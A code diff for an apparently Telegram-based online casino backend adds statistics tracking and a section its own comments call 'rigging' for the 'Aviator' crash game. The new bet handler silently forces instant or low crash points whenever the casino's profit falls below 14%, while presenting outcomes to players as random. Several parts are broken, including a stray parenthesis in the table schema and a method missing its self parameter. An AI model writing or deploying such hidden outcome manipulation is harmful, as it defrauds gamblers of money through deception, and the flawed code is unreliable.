@@ -79,7 +79,11 @@ def init_db():
             current_bet DECIMAL(15, 2) DEFAULT 0.00,
             game_state VARCHAR(50) DEFAULT 'idle',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            aviator_total_bets DECIMAL(12, 2) DEFAULT 0.00,  -- Сумма всех ставок в Авиаторе
+            aviator_total_wins DECIMAL(12, 2) DEFAULT 0.00,  -- Сумма всех выигрышей в Авиаторе
+            aviator_games_played INT DEFAULT 0               -- Количество игр в Авиаторе
+)
         )
         """)
 
@@ -325,6 +329,91 @@ class User:
         finally:
             if connection:
                 connection.close()
+    #=====================================================================
+                    # РАБОТА С АВИАТОР ПОДКРУТКА 
+    #=====================================================================
+    def increment_aviator_games(self, user_id: int):
+        """Увеличивает счетчик игр в Авиаторе"""
+        connection = create_db_connection()
+        if not connection:
+            return
+        try:
+            cursor = connection.cursor()
+            cursor.execute("""
+            UPDATE users SET aviator_games_played = aviator_games_played + 1 
+            WHERE user_id = %s
+            """, (user_id,))
+            connection.commit()
+        except Exception as e:
+            logger.error(f"Error incrementing aviator games: {e}")
+            connection.rollback()
+        finally:
+            if connection:
+                connection.close()
+
+    def update_aviator_total_bets(self, user_id: int, amount: float):
+        """Обновляет общую сумму ставок в Авиаторе"""
+        connection = create_db_connection()
+        if not connection:
+            return
+        try:
+            cursor = connection.cursor()
+            cursor.execute("""
+            UPDATE users SET aviator_total_bets = aviator_total_bets + %s 
+            WHERE user_id = %s
+            """, (amount, user_id))
+            connection.commit()
+        except Exception as e:
+            logger.error(f"Error updating aviator total bets: {e}")
+            connection.rollback()
+        finally:
+            if connection:
+                connection.close()
+
+    def update_aviator_total_wins(self, user_id: int, amount: float):
+        """Обновляет общую сумму выигрышей в Авиаторе"""
+        connection = create_db_connection()
+        if not connection:
+            return
+        try:
+            cursor = connection.cursor()
+            cursor.execute("""
+            UPDATE users SET aviator_total_wins = aviator_total_wins + %s 
+            WHERE user_id = %s
+            """, (amount, user_id))
+            connection.commit()
+        except Exception as e:
+            logger.error(f"Error updating aviator total wins: {e}")
+            connection.rollback()
+        finally:
+            if connection:
+                connection.close()
+
+    def calculate_aviator_rtp(connection):
+        """Рассчитывает фактический RTP только для Авиатора"""
+        try:
+            cursor = connection.cursor()
+            cursor.execute("""
+            SELECT 
+                COALESCE(SUM(aviator_total_bets), 0.01) as total_bets,
+                COALESCE(SUM(aviator_total_wins), 0) as total_wins
+            FROM users
+            """)
+            result = cursor.fetchone()
+            total_bets = float(result[0])
+            total_wins = float(result[1])
+            
+            return {
+                'total_bets': total_bets,
+                'total_wins': total_wins,
+                'rtp': total_wins / total_bets if total_bets > 0 else 0,
+                'casino_profit': total_bets - total_wins
+            }
+        except Exception as e:
+            logger.error(f"Error calculating aviator RTP: {e}")
+            return {'total_bets': 0, 'total_wins': 0, 'rtp': 0, 'casino_profit': 0}
+    #=====================================================================
+
 
     def get_telegram_photo_url(self):
         """Получает URL фото профиля из Telegram"""
@@ -565,16 +654,44 @@ def aviator_bet():
         if user.balance < bet_amount:
             return jsonify({'status': 'error', 'message': 'Not enough balance'}), 400
 
+
+        # Получаем текущую статистику Авиатора
+        aviator_stats = user.calculate_aviator_rtp(connection)
+        target_rtp = 0.86  # 86% RTP (14% доход казино)
+        
+        # Рассчитываем насколько текущий RTP отличается от целевого
+        rtp_diff = aviator_stats['rtp'] - target_rtp
+        
+        # Гарантированный доход казино (14%)
+        guaranteed_profit = aviator_stats['total_bets'] * 0.14
+        actual_profit = aviator_stats['casino_profit']
+        
+        # Если казино недополучает прибыль - увеличиваем вероятность взрыва
+        if actual_profit < guaranteed_profit:
+            # Вычисляем насколько нужно "подкрутить" игру
+            profit_diff = guaranteed_profit - actual_profit
+            aggression = min(1.0, profit_diff / (bet_amount * 10))  # Коэффициент агрессии
+            
+            # Чем больше недополученная прибыль, тем выше шанс взрыва
+            if random.random() < aggression:
+                crash_point = 1.01  # Мгновенный взрыв
+            else:
+                # Повышенная вероятность низких множителей
+                crash_point = round(random.uniform(1.01, 1.5 + (1 - aggression) * 8.5), 2)
+        else:
+            # Нормальный режим (1.1x-10x)
+            crash_point = round(random.uniform(1.1, 10.0), 2)
+
+        # Обновляем статистику
+        user = User({'id': user_id})
         user.balance -= bet_amount
         user.current_bet = bet_amount
         user.game_state = 'bet_placed'
-        # Обновляем статистику
-        user.increment_games_played(user_id)
-        user.update_total_bets(user_id, bet_amount)
-
+        user.increment_aviator_games(user_id)
+        user.update_aviator_total_bets(user_id, bet_amount)
         user.save_game_state(connection)
 
-        crash_point = round(random.uniform(1.1, 10.0), 2)
+        
 
         connection.commit()
 
@@ -622,7 +739,7 @@ def aviator_cashout():
         # Обновляем статистику
         user.increment_wins(user_id)
         user.update_total_wins_amount(user_id, win_amount)
-
+        user.update_aviator_total_wins(user_id, win_amount)
         user.save_game_state(connection)
 
         history_data = {
